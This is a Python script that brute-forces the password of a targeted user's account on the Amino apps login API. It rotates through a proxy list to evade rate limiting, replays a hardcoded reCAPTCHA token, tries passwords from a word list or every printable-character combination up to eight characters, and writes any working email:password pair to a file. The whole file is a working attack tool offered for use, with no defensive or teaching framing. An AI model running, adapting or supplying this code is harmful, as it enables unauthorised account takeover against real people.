import requests
import threading
import time
import random
import sys
import string
import os

try: import colorama
except: print('You need to install dependency "colorama" from PIP ...'); exit()

colorama.init()

session = requests.session()

print('Checking for updates ...')

try:
	_latestVersion = requests.get('')
except:
	pass # to be finished

try:
	proxies = open('proxies.txt','r')
except:
	print('Missing proxy file ...')
	exit()

try:
	word_list = open('words.txt','r')
except:
	print('Missing word list ...')
	exit()


words_collection = word_list.readlines()
length_wordList = len(words_collection)
print('Word List Size: ' + str(length_wordList))


proxy_collection = proxies.readlines()
length_proxies = len(proxy_collection)

print('Proxy List Size: ' + str(length_proxies))

emailIsVaild = False

if sys.platform.startswith('linux'):
	def clear():
		os.system('clear')
else:
	def clear():
		os.system('cls')

global emailToUse
emailToUse = ''
while emailIsVaild == False:
	emailToUse = input('Email Address of Target: ')
	if len(emailToUse.replace(' ','')) == 0:
		print('Email is blank, try again ...')
	else:
		emailIsVaild = True
		break

print('Your proxy list will be now be checked ...') 
time.sleep(1)
clear()
global final_proxyCollection
final_proxyCollection = []

global deadProxies
global aliveProxies

global lastProxyThread

lastProxyThread = ''

deadProxies = 0
aliveProxies = 0

def proxyTestScreen():
	clear()
	print('Active Threads: ' + str(threading.active_count()))
	print('Last Proxy Thread: ' + str(globals()['lastProxyThread']))
	print('Alive Proxies: ' + str(globals()['aliveProxies']))
	print('Dead Proxies: ' + str(globals()['deadProxies']))


def testProxy (proxy):
	proxy = proxy.replace('\n','')
	_testProxy = {'http':str('http://'+str(proxy)),'https':str('http://'+str(proxy))}
	try:
		requests.get('http://www.google.com',proxies=_testProxy,timeout=2.5)
		print('Found an alive proxy: ' + str(proxy))
		globals()['aliveProxies'] += 1
		final_proxyCollection.append(proxy)
		return {'proxy':proxy,'status':'alive'}
	except:
		print('Found Dead Proxy: ' +str(proxy))
		globals()['deadProxies'] += 1
		return {'proxy':proxy,'status':'dead'}


print('Checking proxy list ('+str(length_proxies)+' proxies) ...')
for proxy in proxy_collection:
	proxy = proxy.replace('\n','')
	lastProxyThread = str(proxy)
	t = threading.Thread(target=testProxy,args=(proxy,))

	t.start()
	time.sleep(.025)


while threading.active_count() > 1:
	pass # hold the main thread until the threads finish up

time.sleep(2)

print('\n\nProxies Checked\n'+'-'*len('Proxies Checked'))
print('Alive Proxies: ' + str(aliveProxies))
print('Dead Proxies: ' + str(deadProxies))


while True:
	try: method = int(input('Method (0 = Default, Any other number but 0 = Try Everything Mode): ')); break
	except: print('The method wasn\'t entered correctly ...')

print('Press ENTER / RETURN to Bruteforce ...')
input()
time.sleep(1)
clear()


#print(words_collection)

correctPassword = []

def amino_pass(proxy, password,email):
	_testProxy = {'http':str('http://'+str(proxy)),'https':str('http://'+str(proxy))}
	recaptcha_version = 'v3'
	recaptcha_challenge = "03AOLTBLTAc9t-dPiTwwy6Oq2PvB0jIa-HAQjbo3Q6Grjm89PyR7SLSuDupcW1GME8mcz5KNxjhHBnrfO_dwp6F7lmNGueYECdNfWm3i0KP9EIwCqsFalQw_SOUdlZ47WTQxc35r-ufNsMijK6Kxt8AyMElk9VKM-DMWcr6Q6nwc2vACeumYh7QaC80CpTDcCcQngc8fd5ORWgJJiz_GNVYDKU2fEODHNKRhF6-enRfKPOgakANIuouV2zM3iT3rhvTe_cYRs1sfb_PPByZrWKE4p7_NNsOp4SbfqOZ8XhRigBWE3D3UZ2YMpVBaiSY0SJkiVop2hK65kWXjv2-jHVkMWUsmVYSP9dtCkpaMWAZPLD-o27XWb8TfG3mq2bHccimA4v_KkObv0DqTr9xrmjacXScybsKQms2bIne9j5GFYQw5y7l_gHLXbNcIAAAVZNU-NKttDglIVyKt0vKOTltwn73S-y8HM4fGKryaiX9jzvOBa5v57N3xXwwEWLouPyw50V1y_oGUm6"
	_jsonData = {'recaptcha_challenge':recaptcha_challenge,'recaptcha_version':recaptcha_version,'auth_type':0,'secret':password,'email':email}
	try:
		while True:
			try:
				#print('Attempt password try..')
				rQ = requests.post('https://aminoapps.com/api/auth',json=_jsonData,proxies=_testProxy)
				break
			except:
				#print(final_proxyCollection)
				proxy = final_proxyCollection[random.randint(0,len(final_proxyCollection)-1)]
				_testProxy = {'http':str('http://'+str(proxy)),'https':str('http://'+str(proxy))}
	except:
		#print('[Thread with pass: ' +str(password)+'] Connection failed...')
		return False

	try: 
		rQ.json()['result']
	except:
		#print(rQ.json())
		#print('[Thread with pass: ' +str(password)+'] Instant failure !'); 
		return False

	#print(rQ.json()['result'])

	if 'nickname' in rQ.json()['result']:
		print('Password was correct!')
		passwordFound = open('password_result.txt','w+')
		passwordFound.write(str(str(email)+':'+str(password)))
		passwordFound.close()
		print('PASSWORD = ' + str(password))
		exit()
		return True
	elif 'title' in rQ.json()['result']:
		print('\n'+'-'*32+'Email verification required!\nPassword was: ' + str(password)+'\nURL for Verification: ' +str(rQ.json()['result']['url'])+'\n'+'-'*32)
		passwordFound = open('password_result.txt','w+')
		passwordFound.write(str(str(email)+':'+str(password)))
		passwordFound.close()
		exit()
		return True
	else:
		print(str(password)+' --> Incorrect Password')
		return False

if method == 0:
	for word in words_collection:
		print('Attempting to use password: ' +str(word).replace('\n',''))
		word = str(word).replace('\n','')
		proxy = final_proxyCollection[random.randint(0,len(final_proxyCollection)-1)]
		x = threading.Thread(target=amino_pass,args=(proxy,word,emailToUse,))

		x.start()
		time.sleep(0.075)

	x.join()
	print('Bruteforce Operation Completed!')
	print('[INFO] Closing in 5 seconds ...')
	time.sleep(5)
else:
	print('Password Crack Attempt with Length of 1 ...')
	for i in range(0,len(list(string.printable))-1):
		proxy = final_proxyCollection[random.randint(0,len(final_proxyCollection)-1)]
		print('Attempting password: '+str(list(string.printable)[i]))
		x = threading.Thread(target=amino_pass,args=(proxy,str(list(string.printable)[i]),emailToUse,))

		x.start()

	print('Password Crack Attempt with Length of 2 ...')

	for y in range(0,len(list(string.printable))-1):
		for z in range(0,len(list(string.printable))-1):
			proxy = final_proxyCollection[random.randint(0,len(final_proxyCollection)-1)]
			print('Attempting password: '+str(list(string.printable)[y]+list(string.printable)[z]))
			x = threading.Thread(target=amino_pass,args=(proxy,str(list(string.printable)[y]+list(string.printable)[z]),emailToUse,))

			x.start()

	print('Password Crack Attempt with Length of 3 ...')

	for y in range(0,len(list(string.printable))-1):
		for z in range(0,len(list(string.printable))-1):
			for i in range(0,len(list(string.printable))-1):
				proxy = final_proxyCollection[random.randint(0,len(final_proxyCollection)-1)]
				print('Attempting password: '+str(list(string.printable)[y]+list(string.printable)[z]+list(string.printable)[i]))
				x = threading.Thread(target=amino_pass,args=(proxy,str(list(string.printable)[y]+list(string.printable)[z]+list(string.printable)[i]),emailToUse,))

				x.start()

	print('Password Crack Attempt with Length of 4 ...')

	for y in range(0,len(list(string.printable))-1):
		for z in range(0,len(list(string.printable))-1):
			for i in range(0,len(list(string.printable))-1):
				for n in range(0,len(list(string.printable))-1):
					proxy = final_proxyCollection[random.randint(0,len(final_proxyCollection)-1)]
					print('Attempting password: '+str(list(string.printable)[y]+list(string.printable)[z]+list(string.printable)[i]+list(string.printable)[n]))
					x = threading.Thread(target=amino_pass,args=(proxy,str(list(string.printable)[y]+list(string.printable)[z]+list(string.printable)[i]+list(string.printable)[n]),emailToUse,))

					x.start()

	print('Password Crack Attempt with Length of 5 ...')

	for y in range(0,len(list(string.printable))-1):
		for z in range(0,len(list(string.printable))-1):
			for i in range(0,len(list(string.printable))-1):
				for n in range(0,len(list(string.printable))-1):
					for ii in range(0,len(list(string.printable))-1):
						proxy = final_proxyCollection[random.randint(0,len(final_proxyCollection)-1)]
						print('Attempting password: '+str(list(string.printable)[y]+list(string.printable)[z]+list(string.printable)[i]+list(string.printable)[n])+list(string.printable)[ii])
						x = threading.Thread(target=amino_pass,args=(proxy,str(list(string.printable)[y]+list(string.printable)[z]+list(string.printable)[i]+list(string.printable)[n]+list(string.printable)[ii]),emailToUse,))

						x.start()

	print('Password Crack Attempt with Length of 6 ...')

	for y in range(0,len(list(string.printable))-1):
		for z in range(0,len(list(string.printable))-1):
			for i in range(0,len(list(string.printable))-1):
				for n in range(0,len(list(string.printable))-1):
					for ii in range(0,len(list(string.printable))-1):
						for yy in range(0,len(list(string.printable))-1):
							proxy = final_proxyCollection[random.randint(0,len(final_proxyCollection)-1)]
							print('Attempting password: '+str(list(string.printable)[y]+list(string.printable)[z]+list(string.printable)[i]+list(string.printable)[n])+list(string.printable)[ii]+list(string.printable)[yy])
							x = threading.Thread(target=amino_pass,args=(proxy,str(list(string.printable)[y]+list(string.printable)[z]+list(string.printable)[i]+list(string.printable)[n]+list(string.printable)[ii]+list(string.printable)[yy]),emailToUse,))

							x.start()

	print('Password Crack Attempt with Length of 7 ...')

	for y in range(0,len(list(string.printable))-1):
		for z in range(0,len(list(string.printable))-1):
			for i in range(0,len(list(string.printable))-1):
				for n in range(0,len(list(string.printable))-1):
					for ii in range(0,len(list(string.printable))-1):
						for yy in range(0,len(list(string.printable))-1):
							for zz in range(0,len(list(string.printable))-1):
								proxy = final_proxyCollection[random.randint(0,len(final_proxyCollection)-1)]
								print('Attempting password: '+str(list(string.printable)[y]+list(string.printable)[z]+list(string.printable)[i]+list(string.printable)[n])+list(string.printable)[ii]+list(string.printable)[yy]+list(string.printable)[zz])
								x = threading.Thread(target=amino_pass,args=(proxy,str(list(string.printable)[y]+list(string.printable)[z]+list(string.printable)[i]+list(string.printable)[n]+list(string.printable)[ii]+list(string.printable)[yy]+list(string.printable)[zz]),emailToUse,))

								x.start()

	print('Password Crack Attempt with Length of 8 ...')

	for y in range(0,len(list(string.printable))-1):
		for z in range(0,len(list(string.printable))-1):
			for i in range(0,len(list(string.printable))-1):
				for n in range(0,len(list(string.printable))-1):
					for ii in range(0,len(list(string.printable))-1):
						for yy in range(0,len(list(string.printable))-1):
							for zz in range(0,len(list(string.printable))-1):
								for bb in range(0,len(list(string.printable))-1):
									proxy = final_proxyCollection[random.randint(0,len(final_proxyCollection)-1)]
									print('Attempting password: '+str(list(string.printable)[y]+list(string.printable)[z]+list(string.printable)[i]+list(string.printable)[n])+list(string.printable)[ii]+list(string.printable)[yy]+list(string.printable)[zz]+list(string.printable)[bb])
									x = threading.Thread(target=amino_pass,args=(proxy,str(list(string.printable)[y]+list(string.printable)[z]+list(string.printable)[i]+list(string.printable)[n]+list(string.printable)[ii]+list(string.printable)[yy]+list(string.printable)[zz]+list(string.printable)[bb]),emailToUse,))

									x.start()
